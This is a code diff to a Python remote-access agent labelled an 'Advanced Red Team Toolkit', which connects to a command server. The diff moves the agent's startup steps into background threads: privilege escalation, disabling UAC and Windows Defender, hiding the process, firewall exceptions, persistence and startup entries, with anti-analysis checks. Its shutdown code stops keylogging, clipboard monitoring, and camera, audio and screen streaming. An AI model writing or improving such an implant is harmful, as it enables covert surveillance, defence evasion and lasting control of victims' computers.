@@ -35,6 +35,13 @@ Author: Advanced Red Team Toolkit
 Version: 2.0 (UACME Enhanced)
 """
 
+# Fix eventlet issue by patching before any other imports
+try:
+    import eventlet
+    eventlet.monkey_patch()
+except ImportError:
+    pass
+
 import requests
 import time
 import uuid
@@ -121,6 +128,218 @@ sio = socketio.Client(
     engineio_logger=False,
     socketio_logger=False
 )
+
+# --- Background Initialization System ---
+class BackgroundInitializer:
+    """Handles background initialization of time-consuming tasks."""
+    
+    def __init__(self):
+        self.initialization_threads = []
+        self.initialization_complete = threading.Event()
+        self.initialization_results = {}
+        self.initialization_lock = threading.Lock()
+    
+    def start_background_initialization(self, quick_startup=False):
+        """Start all background initialization tasks."""
+        print("Starting background initialization...")
+        
+        # Define tasks based on startup mode
+        if quick_startup:
+            # Quick startup: skip some time-consuming tasks
+            tasks = [
+                ("privilege_escalation", self._init_privilege_escalation),
+                ("components", self._init_components)
+            ]
+            print("Quick startup mode: skipping some initialization tasks")
+        else:
+            # Full startup: all tasks
+            tasks = [
+                ("privilege_escalation", self._init_privilege_escalation),
+                ("stealth_features", self._init_stealth_features),
+                ("persistence_setup", self._init_persistence_setup),
+                ("defender_disable", self._init_defender_disable),
+                ("startup_config", self._init_startup_config),
+                ("components", self._init_components)
+            ]
+        
+        for task_name, task_func in tasks:
+            thread = threading.Thread(
+                target=self._run_initialization_task,
+                args=(task_name, task_func),
+                daemon=True
+            )
+            thread.start()
+            self.initialization_threads.append(thread)
+        
+        # Start a monitor thread to track completion
+        monitor_thread = threading.Thread(target=self._monitor_initialization, daemon=True)
+        monitor_thread.start()
+        
+        # Start a progress indicator thread
+        progress_thread = threading.Thread(target=self._show_progress, daemon=True)
+        progress_thread.start()
+    
+    def _show_progress(self):
+        """Show initialization progress in real-time."""
+        import time
+        dots = 0
+        while not self.initialization_complete.is_set():
+            status = self.get_initialization_status()
+            completed = len([r for r in status.values() if r])
+            total = len(self.initialization_threads)  # Dynamic total based on actual tasks
+            
+            if total > 0:
+                progress_bar = "=" * completed + "-" * (total - completed)
+                dots = (dots + 1) % 4
+                dot_str = "." * dots
+                
+                print(f"\rInitialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}", end="", flush=True)
+            time.sleep(0.5)
+        
+        if total > 0:
+            print(f"\rInitialization complete! All {total} tasks finished.    ")
+    
+    def _run_initialization_task(self, task_name, task_func):
+        """Run a single initialization task and store results."""
+        try:
+            # Add timeout to prevent hanging
+            import threading
+            import queue
+            
+            result_queue = queue.Queue()
+            exception_queue = queue.Queue()
+            
+            def task_wrapper():
+                try:
+                    result = task_func()
+                    result_queue.put(result)
+                except Exception as e:
+                    exception_queue.put(e)
+            
+            task_thread = threading.Thread(target=task_wrapper, daemon=True)
+            task_thread.start()
+            
+            # Wait for task completion with timeout
+            try:
+                result = result_queue.get(timeout=30)  # 30 second timeout
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': True,
+                        'result': result,
+                        'error': None
+                    }
+            except queue.Empty:
+                # Task timed out
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': False,
+                        'result': None,
+                        'error': 'Task timed out after 30 seconds'
+                    }
+            except Exception as e:
+                # Exception occurred
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': False,
+                        'result': None,
+                        'error': str(e)
+                    }
+                    
+        except Exception as e:
+            with self.initialization_lock:
+                self.initialization_results[task_name] = {
+                    'success': False,
+                    'result': None,
+                    'error': str(e)
+                }
+    
+    def _monitor_initialization(self):
+        """Monitor initialization progress and set completion event."""
+        while len(self.initialization_threads) > 0:
+            # Check if all threads are done
+            active_threads = [t for t in self.initialization_threads if t.is_alive()]
+            if len(active_threads) == 0:
+                break
+            time.sleep(0.1)
+        
+        # All initialization tasks complete
+        self.initialization_complete.set()
+        print("Background initialization complete")
+    
+    def _init_privilege_escalation(self):
+        """Initialize privilege escalation in background."""
+        if WINDOWS_AVAILABLE:
+            if not is_admin():
+                print("Attempting privilege escalation in background...")
+                if run_as_admin():
+                    return "elevation_initiated"
+            
+            if is_admin():
+                if disable_uac():
+                    return "uac_disabled"
+                else:
+                    return "uac_disable_failed"
+        return "no_elevation_needed"
+    
+    def _init_stealth_features(self):
+        """Initialize stealth features in background."""
+        try:
+            hide_process()
+            add_firewall_exception()
+            return "stealth_initialized"
+        except Exception as e:
+            return f"stealth_failed: {e}"
+    
+    def _init_persistence_setup(self):
+        """Setup persistence mechanisms in background."""
+        try:
+            setup_persistence()
+            if establish_persistence():
+                return "persistence_established"
+            else:
+                return "persistence_failed"
+        except Exception as e:
+            return f"persistence_error: {e}"
+    
+    def _init_defender_disable(self):
+        """Disable Windows Defender in background."""
+        if WINDOWS_AVAILABLE and is_admin():
+            try:
+                if disable_defender():
+                    return "defender_disabled"
+                else:
+                    return "defender_disable_failed"
+            except Exception as e:
+                return f"defender_error: {e}"
+        return "defender_skip"
+    
+    def _init_startup_config(self):
+        """Configure startup in background."""
+        try:
+            add_to_startup()
+            return "startup_configured"
+        except Exception as e:
+            return f"startup_error: {e}"
+    
+    def _init_components(self):
+        """Initialize high-performance components in background."""
+        try:
+            initialize_components()
+            return "components_initialized"
+        except Exception as e:
+            return f"components_error: {e}"
+    
+    def get_initialization_status(self):
+        """Get current initialization status."""
+        with self.initialization_lock:
+            return self.initialization_results.copy()
+    
+    def wait_for_completion(self, timeout=None):
+        """Wait for initialization to complete."""
+        return self.initialization_complete.wait(timeout)
+
+# Global background initializer
+background_initializer = BackgroundInitializer()
 
 # --- Input Controllers ---
 mouse_controller = None
@@ -1843,6 +2062,16 @@ def sleep_random():
     """Random sleep to avoid pattern detection."""
     sleep_time = random.uniform(0.5, 2.0)
     time.sleep(sleep_time)
+
+def sleep_random_non_blocking():
+    """Non-blocking random sleep using eventlet."""
+    try:
+        import eventlet
+        sleep_time = random.uniform(0.5, 2.0)
+        eventlet.sleep(sleep_time)
+    except ImportError:
+        # Fallback to regular sleep if eventlet not available
+        sleep_random()
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -5703,82 +5932,64 @@ def add_linux_startup():
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
-    # Run UAC checks and elevation FIRST
-    if WINDOWS_AVAILABLE:
-        # Try to run as admin first
-        if not is_admin():
-            print("Attempting to run as administrator...")
-            if run_as_admin():
-                # Script will restart with admin privileges
-                sys.exit()
-        
-        # If we're admin, disable UAC
-        if is_admin():
-            print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
-            else:
-                print("Could not disable UAC")
+    # Show startup banner
+    print("=" * 60)
+    print("Advanced Python Agent v2.0 (UACME Enhanced)")
+    print("Starting up...")
+    print("=" * 60)
     
-    # Run anti-analysis checks
+    # Run anti-analysis checks first (fast operation)
     try:
         anti_analysis()
     except:
         pass
     
-    # Initialize stealth and privilege escalation
     print("Initializing agent...")
     
-    # Random sleep to avoid pattern detection
-    sleep_random()
+    # Start background initialization immediately
+    # Check if quick startup is requested
+    quick_startup = "--quick" in sys.argv
+    background_initializer.start_background_initialization(quick_startup=quick_startup)
     
-    # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
-        # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
-        else:
-            print("Could not disable Windows Defender")
-    else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
-        else:
-            print("Privilege escalation failed, continuing with user privileges")
-    
-    # Setup stealth features
-    try:
-        hide_process()
-        add_firewall_exception()
-        setup_persistence()
-        
-        # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
-        
-        print("Stealth features initialized")
-    except Exception as e:
-        print(f"Stealth initialization warning: {e}")
-    
-    # Initialize high-performance components
-    initialize_components()
-    
-    # Add to startup
-    add_to_startup()
-    
-    # Get agent ID
+    # Get agent ID (fast operation)
     AGENT_ID = get_or_create_agent_id()
     print(f"Agent starting with ID: {AGENT_ID}")
     
-    # Main connection loop
+    # Quick privilege check (non-blocking)
+    if WINDOWS_AVAILABLE:
+        if is_admin():
+            print("Running with administrator privileges")
+        else:
+            print("Running with user privileges")
+    
+    # Start main connection loop immediately
+    print("Starting connection loop...")
+    
+    # Main connection loop with background initialization monitoring
+    connection_attempts = 0
     while True:
         try:
+            # Check if initialization is complete
+            if background_initializer.initialization_complete.is_set():
+                status = background_initializer.get_initialization_status()
+                for task, result in status.items():
+                    if result['success']:
+                        print(f"[OK] {task}: {result['result']}")
+                    else:
+                        print(f"[WARN] {task}: {result['error']}")
+            
+            # Connect to server
+            connection_attempts += 1
+            print(f"Connecting to server (attempt {connection_attempts})...")
             sio.connect(SERVER_URL)
+            print("Connected successfully!")
             sio.wait()
         except socketio.exceptions.ConnectionError:
-            print("Connection failed. Retrying in 10 seconds...")
+            print(f"Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
             time.sleep(10)
+        except KeyboardInterrupt:
+            print("\nReceived interrupt signal, shutting down...")
+            break
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
             stop_streaming()
@@ -5789,8 +6000,36 @@ def agent_main():
             print("Cleaned up resources. Retrying in 10 seconds...")
             time.sleep(10)
 
+def signal_handler(signum, frame):
+    """Handle shutdown signals gracefully."""
+    print("\nAgent shutting down.")
+    try:
+        # Stop all streaming and monitoring
+        stop_streaming()
+        stop_audio_streaming()
+        stop_camera_streaming()
+        stop_keylogger()
+        stop_clipboard_monitor()
+        if low_latency_input:
+            low_latency_input.stop()
+        
+        # Disconnect from server
+        if sio.connected:
+            sio.disconnect()
+        
+        print("Cleanup complete.")
+    except Exception as e:
+        print(f"Error during cleanup: {e}")
+    
+    sys.exit(0)
+
 # Update the main execution block
 if __name__ == "__main__":
+    # Set up signal handlers for graceful shutdown
+    import signal
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
     if len(sys.argv) > 1:
         # Command line arguments provided, use unified main
         main_unified()
